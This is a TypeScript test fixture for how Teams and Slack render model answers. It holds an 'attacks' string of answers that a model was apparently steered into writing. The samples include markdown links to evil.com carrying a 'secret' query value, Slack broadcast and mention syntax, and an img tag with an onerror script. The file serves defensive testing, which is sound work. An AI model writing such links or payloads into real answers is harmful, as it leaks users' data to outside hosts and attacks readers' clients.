// Answers the chat app doors are tested with (channels-answer,
// channels-slack, channels-inert): what the model writes, as Teams and
// Slack would read it.

/**
 * An answer the model was steered into writing links in, each form Teams or
 * Slack might read as one, a paragraph each: inline, a reference whose
 * definition comes later, in a fence, in a table's cell, Slack's own
 * link, mention and broadcast, a Teams mention, an image tag with an
 * unquoted address, and brackets spelled as entities.
 */
export const attacks = [
  'Read [the policy](https://evil.com/p?d=secret "t") now.',
  "Ask [your lead][lead] first, or [HR].",
  "```\n[in a fence](https://evil.com/f)\n```",
  "| Who | Where |\n|---|---|\n| Ben | [his page](https://evil.com/t) |",
  "<https://evil.com/s|click> <@U0123ABCD> <!here> <at>Ben</at>",
  "<img src=https://evil.com/i.png onerror=alert(1)>",
  "&#91;spelled&#93;&#40;https://evil.com/e&#41;",
  "[lead]: https://evil.com/lead\n[HR]: https://evil.com/hr",
].join("\n\n");

/** An ordinary answer: bold, a short list and a code block. */
export const ordinary =
  "**Leave** lasts _sixteen_ weeks:\n\n- one part\n- two parts\n\n```\nleave = 16\n```";
